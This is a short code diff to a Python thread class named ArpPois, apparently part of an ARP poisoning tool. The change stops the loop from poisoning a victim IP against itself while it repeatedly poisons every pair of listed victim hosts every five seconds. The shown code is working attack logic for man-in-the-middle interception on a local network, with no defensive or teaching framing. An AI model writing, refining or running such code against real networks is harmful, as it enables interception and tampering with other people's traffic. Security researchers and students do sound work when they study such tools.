@@ -46,8 +46,10 @@ class ArpPois(threading.Thread):
         signal.signal(signal.SIGINT, signal_handler)
 
         while 1:
+            # TODO: WHILE NOT THE SAME
             for ip, mac in zip(self.victims_ip, self.victims_mac):
                 for ip2, mac2 in zip(self.victims_ip, self.victims_mac):
-                    print(ip2, ip, mac2, mac)
-                    self.poison(ip2, ip, mac2, mac)
+                    if ip != ip2:
+                        print(ip2, ip, mac2, mac)
+                        self.poison(ip2, ip, mac2, mac)
             time.sleep(5)
